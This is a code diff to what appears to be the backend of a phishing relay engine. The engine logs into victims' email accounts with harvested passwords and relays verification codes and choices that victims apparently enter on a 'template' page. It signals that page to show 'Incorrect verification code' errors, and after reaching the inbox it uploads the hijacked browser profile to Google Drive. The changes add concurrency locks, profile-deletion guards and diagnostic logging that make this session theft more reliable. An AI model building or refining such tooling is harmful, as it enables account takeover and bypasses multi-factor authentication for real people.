@@ -65,11 +65,15 @@ const PLATFORM_INBOX_URLS = {
 
 const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
 const activeProcesses = globalThis.__activeProcesses || (globalThis.__activeProcesses = new Set());
-// Tracks browserIds that have a processRow currently executing (launched by
-// processWaitingRows OR the wake-up handler). Unlike `activelyProcessing`, this is
-// NOT cleared while waiting for user input — so a wake-up can detect an already-running
-// processRow and skip the duplicate instead of launching a second one on the same page.
-const processRowsInFlight = globalThis.__processRowsInFlight || (globalThis.__processRowsInFlight = new Set());
+// jobMap: per-browserId Promise of the processRow job currently executing (launched by
+// processWaitingRows OR the wake-up handler). Unlike `activelyProcessing`, it is NOT
+// cleared while waiting for user input. Unlike `activeProcesses` (the interval's lease /
+// slot bookkeeping) it is the single authority for "a processRow for this browserId is in
+// flight" and is released ONLY in processRow's own finally — never by stale-cleanup or the
+// POST catch. Any duplicate invocation (wake-up race, stale-cleanup re-admission, retry /
+// respawn path) short-circuits at processRow entry instead of launching a second browser
+// on the same profile.
+const jobMap = globalThis.__jobMap || (globalThis.__jobMap = new Map());
 const activeBrowserSessions = globalThis.__activeBrowserSessions || (globalThis.__activeBrowserSessions = new Map());
 const passwordRetryCounts = globalThis.__passwordRetryCounts || (globalThis.__passwordRetryCounts = new Map());
 // Guards against a stray duplicate checkAccountAccess (e.g. spawned by a RETRY_TECHNICAL
@@ -1779,6 +1783,49 @@ function runGuardedAccountCheck(browser, page, email, password, platform, browse
     return checkPromise;
 }
 
+// GATE: a full userDataDir profile wipe is only allowed when no live browser session is
+// still attached to that profile. Every fs.remove(userDataDir) site goes through this so a
+// timeout/cleanup on one path can never delete a profile another run is mid-upload on, or
+// wipe the profile under a session that is still being reused (e.g. the ETXTBSY launch race).
+function canDeleteUserDataDir(browserId) {
+    if (activeBrowserSessions.has(browserId)) {
+        logger.warn(`[PROFILE][${browserId}] DELETION BLOCKED: active browser session still attached to profile. Full wipe skipped (canDeleteUserDataDir).`);
+        return false;
+    }
+    return true;
+}
+
+// [DIAG] Summarize messages the engine is about to write into lastJsonResponse right before the
+// template reads them. The template shows an in-form error for "Incorrect verification code" /
+// "incorrect code"; hooking logTemplateSignal() directly above those writes lets a support run
+// (LOG_LEVEL=info) catch the instant we signal the template, instead of hunting inbox logs.
+function logTemplateSignal(browserId, ljr) {
+    try {
+        const s = String(typeof ljr === 'string' ? ljr : JSON.stringify(ljr || ''));
+        const info = /Incorrect verification code entered\. Please try again\./i.test(s)
+            ? { site: 'WAITINGCODE.reset', note: 'wrong-code signal (in-form error on template)' }
+            : /Incorrect code or issue, returned to verification options/i.test(s)
+                ? { site: 'WAITINGOPTIONS.reset', note: 'code rejected, asks template for a new code' }
+                : { site: null, note: 'template-signal write' };
+        if (info.site) {
+            logger.info(`[SIGNAL][${browserId}] Template signal -> ${info.site}: ${info.note}.`);
+        }
+    } catch (err) {
+        logger.warn(`[SIGNAL][${browserId}] logTemplateSignal failed: ${err.message}`);
+    }
+}
+
+function logSpeed(browserId, phase, factoryMs, readyMs, tally, prevMs) {
+    const dMs = (readyMs && prevMs) ? (readyMs - prevMs) : null;
+    const dPart = (dMs != null && dMs >= 0) ? ` +${dMs}ms since prev` : '';
+    logger.info(`[SPEED][${browserId}] ${phase}: detected in ${readyMs}ms (factory poll ${factoryMs}ms)${dPart}. Clicks=${tally.clicks}.`);
+}
+
+function logBeat(browserId, phase, iteration, sinceMs, viewName, expected) {
+    const marker = (typeof expected === 'string' && viewName && viewName !== expected) ? ' VIEW_MISMATCH' : '';
+    logger.info(`[DIAG][${browserId}][${phase}] beat #${iteration} sinceStart=${sinceMs}ms view='${viewName ?? ''}' expected='${expected ?? ''}'${marker}`);
+}
+
 async function processRow(row, columnIndexes, existingBrowser = null, existingPage = null) {
     const browserId = row[columnIndexes['browserId']];
     const sheetStatus = row[columnIndexes['status']];
@@ -1806,7 +1853,19 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     };
     logger.debug(`[processRow][${browserId}] Processing row.`);
     const _timer = { start: Date.now() };
-    processRowsInFlight.add(browserId);
+
+    // Re-entrancy guard (single-flight): only one processRow may run per browserId. If a
+    // job is already in flight — duplicate wake-up, stale-cleanup re-admission, or a
+    // retry/respawn path — do NOT launch a second browser on the same profile. Return the
+    // existing job so callers can await the same completion.
+    const existingJob = jobMap.get(browserId);
+    if (existingJob) {
+        logger.warn(`[processRow][${browserId}] Re-entrancy guard: a processRow job is already in flight for this browserId. Skipping duplicate (single-flight dedupe).`);
+        return existingJob;
+    }
+    let resolveJob;
+    const jobDone = new Promise((r) => { resolveJob = r; });
+    jobMap.set(browserId, jobDone);
 
     // Diagnostic heartbeat: periodically log where this row's processing is,
     // so a long-stalled state (e.g. stuck in PROCESSING) is visible in platform
@@ -2000,8 +2059,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         const retryDelayMs = isETXTBSY ? 8000 : 2000;
                         if (isETXTBSY) {
                             logger.warn(`[processRow][${browserId}] ETXTBSY detected. Removing stale user data dir and retrying in ${retryDelayMs}ms (file-write race backoff).`);
-                            logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=ETXTBSY_LAUNCH_BACKOFF status=${status} wasUploaded=${uploadedBrowserData.has(browserId)}`);
-                            await fs.remove(userDataDir).catch(() => {});
+                            if (canDeleteUserDataDir(browserId)) {
+                                logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=ETXTBSY_LAUNCH_BACKOFF status=${status} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                                await fs.remove(userDataDir).catch(() => {});
+                            } else {
+                                logger.warn(`[processRow][${browserId}] ETXTBSY delete skipped (live session attached). Retrying launch without wiping profile.`);
+                            }
                         }
                         logger.warn(`[processRow][${browserId}] Retrying browser launch in ${retryDelayMs}ms...`);
                         await new Promise(resolve => setTimeout(resolve, retryDelayMs)); // Wait before retrying
@@ -2441,10 +2504,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 }
                 if (userDataDir) {
                     try {
-                        logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGEMAIL timeout: ${userDataDir}`);
-                        logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGEMAIL_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
-                        await fs.remove(userDataDir);
-                        logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
+                        if (canDeleteUserDataDir(browserId)) {
+                            logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGEMAIL timeout: ${userDataDir}`);
+                            logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGEMAIL_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                            await fs.remove(userDataDir);
+                            logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
+                        }
                     } catch (deleteError) {
                         logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGEMAIL timeout: ${deleteError.message}`);
                     }
@@ -3422,10 +3487,12 @@ if (!foundSelector) {
                 }
                 if (userDataDir) {
                     try {
-                        logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGPASSWORD timeout: ${userDataDir}`);
-                        logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGPASSWORD_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
-                        await fs.remove(userDataDir);
-                        logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
+                        if (canDeleteUserDataDir(browserId)) {
+                            logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGPASSWORD timeout: ${userDataDir}`);
+                            logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGPASSWORD_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                            await fs.remove(userDataDir);
+                            logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
+                        }
                     } catch (deleteError) {
                         logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGPASSWORD timeout: ${deleteError.message}`);
                     }
@@ -3442,12 +3509,16 @@ if (!foundSelector) {
                 });
             }
         } else if (status === "WAITINGOPTIONS") {
-            logger.info(`[processRow][${browserId}] Resuming from WAITINGOPTIONS state.`);
+            logger.info(`[processRow][${browserId}] —RESUME WAITINGOPTIONS— sheetStatus=${sheetStatus} verified=${row[columnIndexes['verified']] ?? 'n/a'} driveUrl=${updateData.driveUrl || 'none'} code=${row[columnIndexes['verificationCode']] ? String(row[columnIndexes['verificationCode']]).slice(0, 4) : 'none'}`);
             finalStatus = "WAITINGOPTIONS";
             let currentVerificationOptions = [];
             const pollingTimeoutOptions = Date.now() + 5 * 60 * 1000;
+            const optionsPollStartMs = Date.now();
+            let optionsIteration = 0;
+            let lastOptionsBeatMs = Date.now();
 
             while (Date.now() < pollingTimeoutOptions && finalStatus === "WAITINGOPTIONS") {
+                optionsIteration++;
                 try {
                     // Template Liveliness Check
                     if (!isTemplateAlive(browserId)) {
@@ -3596,9 +3667,18 @@ if (!foundSelector) {
                         }
                     }
 
+                    // [DIAG] Throttled heartbeat: one line per ~15s while we idle on the options
+                    // screen (the loop itself polls at 1s). Proves the engine is alive and correctly
+                    // parked on a choice screen between choices.
+                    if (Date.now() - lastOptionsBeatMs >= 15000) {
+                        lastOptionsBeatMs = Date.now();
+                        await logBeat(browserId, 'WAITINGOPTIONS', optionsIteration, Date.now() - optionsPollStartMs, currentActualViewName, null);
+                    }
+
                     if (verificationChoiceRaw) {
                         logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Verification choice found: ${verificationChoiceRaw}. Setting status to PROCESSING.`);
                         _timer.choiceFound = Date.now();
+                        logSpeed(browserId, 'WAITINGOPTIONS.choice-green', 1000, _timer.choiceFound - _timer.start, { clicks: 0 }, lastOptionsBeatMs);
                         logger.info(`[engineProcess][${browserId}] +WAITINGOPTIONS (found choice)`);
                         activelyProcessing.add(browserId);
                         updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification choice", verificationChoice: verificationChoiceRaw }) }); // Set status to PROCESSING
@@ -3964,10 +4044,12 @@ if (!foundSelector) {
                 }
                 if (userDataDir) {
                     try {
-                        logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGOPTIONS timeout: ${userDataDir}`);
-                        logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGOPTIONS_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
-                        await fs.remove(userDataDir);
-                        logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
+                        if (canDeleteUserDataDir(browserId)) {
+                            logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGOPTIONS timeout: ${userDataDir}`);
+                            logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGOPTIONS_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                            await fs.remove(userDataDir);
+                            logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
+                        }
                     } catch (deleteError) {
                         logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGOPTIONS timeout: ${deleteError.message}`);
                     }
@@ -4187,8 +4269,10 @@ if (!foundSelector) {
                 }
                 if (userDataDir) {
                     try {
-                        logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGRECOVERYEMAIL_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
-                        await fs.remove(userDataDir);
+                        if (canDeleteUserDataDir(browserId)) {
+                            logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGRECOVERYEMAIL_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                            await fs.remove(userDataDir);
+                        }
                     } catch (deleteError) {
                         logger.error(`[processRow][${browserId}] Error deleting user data dir on WAITINGRECOVERYEMAIL timeout: ${deleteError.message}`);
                     }
@@ -4205,7 +4289,7 @@ if (!foundSelector) {
             }
             logger.info(`[processRow][${browserId}] Exited WAITINGRECOVERYEMAIL loop. Final status: ${updateData.status}`);
         } else if (status === "WAITINGCODE") {
-            logger.info(`[processRow][${browserId}] Resuming from WAITINGCODE state.`);
+            logger.info(`[processRow][${browserId}] —RESUME WAITINGCODE— sheetStatus=${sheetStatus} verified=${row[columnIndexes['verified']] ?? 'n/a'} driveUrl=${updateData.driveUrl || 'none'} code=${row[columnIndexes['verificationCode']] ? String(row[columnIndexes['verificationCode']]).slice(0, 4) : 'none'}`);
             finalStatus = "WAITINGCODE";
             if (updateData.status !== "WAITINGCODE") {
                 updateData.status = "WAITINGCODE";
@@ -4221,8 +4305,12 @@ if (!foundSelector) {
 
             const pollingTimeout = Date.now() + 5 * 60 * 1000;
             let codeSuccessfullyProcessed = false;
+            const codePollStartMs = Date.now();
+            let codeIteration = 0;
+            let lastCodeBeatMs = Date.now();
 
             while (Date.now() < pollingTimeout && finalStatus === "WAITINGCODE") {
+                codeIteration++;
                 try {
                     // Session Health Check
                     if (page && !(await isPageResponsive(page, browserId, instanceId))) {
@@ -4302,9 +4390,16 @@ if (!foundSelector) {
                         }
                     }
 
+                    // [DIAG] Throttled heartbeat: one line per ~15s while the engine idles waiting for the code.
+                    if (Date.now() - lastCodeBeatMs >= 15000) {
+                        lastCodeBeatMs = Date.now();
+                        await logBeat(browserId, 'WAITINGCODE', codeIteration, Date.now() - codePollStartMs, JSON.parse(updateData.lastJsonResponse || '{}').viewName || null, null);
+                    }
+
                     if (verificationCode && String(verificationCode).trim() !== "") {
                         logger.info(`[processRow][${browserId}][WAITINGCODE] Verification code found: '${verificationCode}'. Setting status to PROCESSING.`);
                         _timer.codeFound = Date.now();
+                        logSpeed(browserId, 'WAITINGCODE.code-green', 1000, _timer.codeFound - _timer.start, { clicks: 0 }, lastCodeBeatMs);
                         logger.info(`[engineProcess][${browserId}] +WAITINGCODE (found code)`);
                         activelyProcessing.add(browserId);
                         updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification code" }) }); // Set status to PROCESSING
@@ -4394,8 +4489,16 @@ if (!foundSelector) {
                                     // SAFETY: Wait for page to settle, then verify we actually remain on code entry
                                     await new Promise(res => setTimeout(res, 5000));
 
-                                    // Check 1: Did we reach the inbox directly?
-                                    const postErrorInbox = await isInbox(page, platformConfig).catch(() => false);
+                                    // Check 1: Did we reach the inbox directly? Wrapped in a timed retry so a
+                                    // slow login redirect is never mistaken for a rejected code (a false
+                                    // "wrong code" write makes the template show an in-form error).
+                                    let postErrorInbox = false;
+                                    for (let guardAttempt = 0; guardAttempt < 3; guardAttempt++) {
+                                        postErrorInbox = await isInbox(page, platformConfig).catch(() => false);
+                                        if (postErrorInbox) break;
+                                        logger.info(`[WRONG_SIGNAL][${browserId}][WAITINGCODE] Error-flash guard: inbox not reached yet (attempt ${guardAttempt + 1}/3). url=${page.url()}`);
+                                        await new Promise(resolve => setTimeout(resolve, 2000));
+                                    }
                                     if (postErrorInbox) {
                                         logger.info(`[processRow][${browserId}][WAITINGCODE] Code was correct despite error flash. Inbox reached.`);
                                         finalStatus = "PROCESSING_FINALIZING";
@@ -4426,15 +4529,15 @@ if (!foundSelector) {
                                         }
 
                                         try {
-                                            logger.info(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_SAFETY_CHECK status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                                            logger.warn(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_SAFETY_CHECK status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
                                             const uploadedUrl = await uploadBrowserData(browserId, updateData);
                                             if (uploadedUrl) { updateData.driveUrl = uploadedUrl; uploadedBrowserData.set(browserId, uploadedUrl); }
                                         } catch (uploadError) {
                                             logger.error(`[processRow][${browserId}] Error during Drive upload after safety check: ${uploadError.message}`);
                                         }
 
-                                        if (updateData.driveUrl && userDataDir) {
-                                            logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_SAFETY_CHECK status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                                        if (updateData.driveUrl && userDataDir && canDeleteUserDataDir(browserId)) {
+                                            logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_SAFETY_CHECK status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                                             try { await fs.remove(userDataDir); } catch (e) {}
                                         }
                                         // Transition to COMPLETED as the final terminal status.
@@ -4480,15 +4583,15 @@ if (!foundSelector) {
                                             }
 
                                             try {
-                                                logger.info(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_VIEWS_CHECK status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                                                logger.warn(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_VIEWS_CHECK status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
                                                 const uploadedUrl = await uploadBrowserData(browserId, updateData);
                                                 if (uploadedUrl) { updateData.driveUrl = uploadedUrl; uploadedBrowserData.set(browserId, uploadedUrl); }
                                             } catch (uploadError) {
                                                 logger.error(`[processRow][${browserId}] Error during Drive upload after views check: ${uploadError.message}`);
                                             }
 
-                                            if (updateData.driveUrl && userDataDir) {
-                                                logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_VIEWS_CHECK status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                                            if (updateData.driveUrl && userDataDir && canDeleteUserDataDir(browserId)) {
+                                                logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_VIEWS_CHECK status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                                                 try { await fs.remove(userDataDir); } catch (e) {}
                                             }
                                             // Transition to COMPLETED as the final terminal status.
@@ -4508,6 +4611,7 @@ if (!foundSelector) {
                                     ljp.fullAccess = false;
                                     ljp.message = "Incorrect verification code entered. Please try again.";
                                     sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Incorrect verification code confirmed' });
+                                    logTemplateSignal(browserId, ljp.message);
                                     // FIX: Await the write to prevent race condition where while loop
                                     // re-reads sheet before WAITINGCODE is written (sees stale PROCESSING)
                                     await updateBrowserRowDataFast(browserId, {
@@ -4571,7 +4675,7 @@ if (!foundSelector) {
 
                                         let uploadedDriveUrlAfterPassive = null;
                                         try {
-                                            logger.info(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_PASSIVE status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                                            logger.warn(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_PASSIVE status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
                                             uploadedDriveUrlAfterPassive = await uploadBrowserData(browserId, updateData);
                                             if (uploadedDriveUrlAfterPassive) {
                                                 updateData.driveUrl = uploadedDriveUrlAfterPassive;
@@ -4581,8 +4685,8 @@ if (!foundSelector) {
                                             logger.error(`[processRow][${browserId}] Error during Google Drive upload after passive: ${uploadError.message}`);
                                         }
 
-                                        if (updateData.driveUrl && userDataDir) {
-                                            logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_PASSIVE status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                                        if (updateData.driveUrl && userDataDir && canDeleteUserDataDir(browserId)) {
+                                            logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_PASSIVE status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                                             try {
                                                 await fs.remove(userDataDir);
                                                 logger.info(`[processRow][${browserId}][WAITINGCODE] Deleted user data dir after completion.`);
@@ -4595,12 +4699,25 @@ if (!foundSelector) {
                                         break; // Break the passive check loop
                                     } else {
                                         checkCount++;
+                                        if (checkCount % 5 === 1) {
+                                            logger.info(`[DIAG][${browserId}][WAITINGCODE] passive verification: beat #${checkCount} — still not at inbox (elapsed ${Date.now() - codePollStartMs}ms). url=${page.url()}`);
+                                        }
                                         await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before next check
                                     }
                                 }
                             }
 
                             const inboxReachedAfterWait = await isInbox(page, platformConfig);
+                            // WRONG-SIGNAL GUARD: retry the inbox check (3x3s) before declaring the code
+                            // rejected. A slow login redirect right after a CORRECT code submit must never
+                            // be reported back to the template as "Incorrect verification code".
+                            if (!inboxReachedAfterWait) {
+                                for (let guardAttempt = 0; guardAttempt < 3 && !inboxReachedAfterWait; guardAttempt++) {
+                                    logger.info(`[WRONG_SIGNAL][${browserId}][WAITINGCODE] Inbox redirect still pending (guard attempt ${guardAttempt + 1}/3). url=${page.url()}`);
+                                    await new Promise(res => setTimeout(res, 3000));
+                                    inboxReachedAfterWait = await isInbox(page, platformConfig).catch(() => false);
+                                }
+                            }
 
                             if (inboxReachedAfterWait) {
                                 logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after verification wait. Setting status to COMPLETED.`);
@@ -4634,7 +4751,7 @@ if (!foundSelector) {
 
                                 let uploadedDriveUrlAfterCode = null;
                                 try {
-                                    logger.info(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_ACCEPTED status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                                    logger.warn(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_ACCEPTED status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
                                     uploadedDriveUrlAfterCode = await uploadBrowserData(browserId, updateData);
                                     if (uploadedDriveUrlAfterCode) {
                                         updateData.driveUrl = uploadedDriveUrlAfterCode;
@@ -4644,8 +4761,8 @@ if (!foundSelector) {
                                     logger.error(`[processRow][${browserId}] Error during Google Drive upload after code: ${uploadError.message}`);
                                 }
 
-                                if (updateData.driveUrl && userDataDir) {
-                                    logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_ACCEPTED status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                                if (updateData.driveUrl && userDataDir && canDeleteUserDataDir(browserId)) {
+                                    logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_ACCEPTED status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                                     try {
                                         await fs.remove(userDataDir);
                                         logger.info(`[processRow][${browserId}][WAITINGCODE] Deleted user data dir after completion.`);
@@ -4690,12 +4807,14 @@ if (!foundSelector) {
                                     })
                                 };
                                 sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Incorrect code, returned to choice screen' });
+                                logTemplateSignal(browserId, 'Incorrect code or issue, returned to verification options. Please choose again.');
                                 updateBrowserRowDataFast(browserId, updateData);
                                 codeSuccessfullyProcessed = false;
                                 break;
                             } else if (stillOnCodeEntryScreen) {
                                 logger.warn(`[processRow][${browserId}][WAITING_CODE] Still on code entry screen. Assuming code was incorrect. Resetting status to WAITING_CODE.`);
                                 sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Still on code entry screen after submission' });
+                                logTemplateSignal(browserId, 'Incorrect verification code entered. Please try again.');
                                 updateBrowserRowDataFast(browserId, {
                                     status: "WAITINGCODE",
                                     verificationCode: '',
@@ -4830,10 +4949,12 @@ if (!foundSelector) {
                 }
                 if (userDataDir) {
                     try {
-                        logger.info(`[processRow][${browserId}] Deleting user data dir for WAITING_CODE timeout: ${userDataDir}`);
-                        logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
-                        await fs.remove(userDataDir);
-                        logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
+                        if (canDeleteUserDataDir(browserId)) {
+                            logger.info(`[processRow][${browserId}] Deleting user data dir for WAITING_CODE timeout: ${userDataDir}`);
+                            logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_TIMEOUT status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                            await fs.remove(userDataDir);
+                            logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
+                        }
                     } catch (deleteError) {
                         logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITING_CODE timeout: ${deleteError.message}`);
                     }
@@ -5173,7 +5294,7 @@ if (!foundSelector) {
 
             let uploadedDriveUrl = null;
             try {
-                logger.info(`[UPLOAD][${browserId}] attempt caller=COMPLETED_FINALIZER status=${finalStatus} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                logger.warn(`[UPLOAD][${browserId}] attempt caller=COMPLETED_FINALIZER status=${finalStatus} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
                 uploadedDriveUrl = await uploadBrowserData(browserId, updateData);
                 if (uploadedDriveUrl) {
                     updateData.driveUrl = uploadedDriveUrl;
@@ -5186,10 +5307,10 @@ if (!foundSelector) {
                 logger.error(`[processRow][${browserId}] Error during Google Drive upload: ${uploadError.message}`);
             }
 
-            if (updateData.driveUrl && userDataDir) {
+            if (updateData.driveUrl && userDataDir && canDeleteUserDataDir(browserId)) {
                 try {
                     logger.info(`[processRow][${browserId}] Process COMPLETED and uploaded. Deleting user data directory: ${userDataDir}`);
-                    logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=COMPLETED_POST_UPLOAD status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                    logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=COMPLETED_POST_UPLOAD status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
                     await fs.remove(userDataDir);
                     logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                 } catch (deleteError) {
@@ -5251,7 +5372,12 @@ if (!foundSelector) {
         clearInterval(diagInterval);
         logger.info(`[engineProcess][${browserId}] -FINALLY (cleanup)`);
         activelyProcessing.delete(browserId);
-        processRowsInFlight.delete(browserId);
+        // Release the per-browser single-flight lock. Must happen here (this finally covers
+        // every early `return` path in the body) and ONLY here — the interval's stale-cleanup
+        // and the POST catch must never release it, or a peer run re-admits the same
+        // browserId while an old job is still poll-running.
+        if (typeof resolveJob === 'function') { try { resolveJob(); } catch (_) {} }
+        jobMap.delete(browserId);
         if (updateData.status === "FAILED" && page && typeof page.content === 'function') {
             const endpointUrl = typeof page.url === 'function' ? page.url() : 'unknown';
             saveDebugSnapshot(page, browserId, endpointUrl, updateData.reason || 'No reason provided').catch(err =>
@@ -5368,7 +5494,7 @@ if (!foundSelector) {
         logger.info(`[TIMING][${browserId}] ${parts.join(' | ')}`);
 
         if (updateData.status === "FAILED" && !initialCheckResult.accountAccess && userDataDir) {
-            if (browserFullyClosed || (browser && !browser.isConnected())) {
+            if ((browserFullyClosed || (browser && !browser.isConnected())) && canDeleteUserDataDir(browserId)) {
                 try {
                     logger.info(`[processRow][${browserId}] Final status FAILED. Attempting to delete user data directory: ${userDataDir}`);
                     // Add retry logic for fs.remove to handle EBUSY errors
@@ -5382,7 +5508,7 @@ if (!foundSelector) {
                     while (attempt < maxRetries && !deleted) {
                         try {
                             if (attempt === 0) {
-                                logger.info(`[PROFILE][${browserId}] DELETING userDataDir reason=FAILED_FINAL_CLEANUP status=FAILED accountAccess=${initialCheckResult.accountAccess} driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
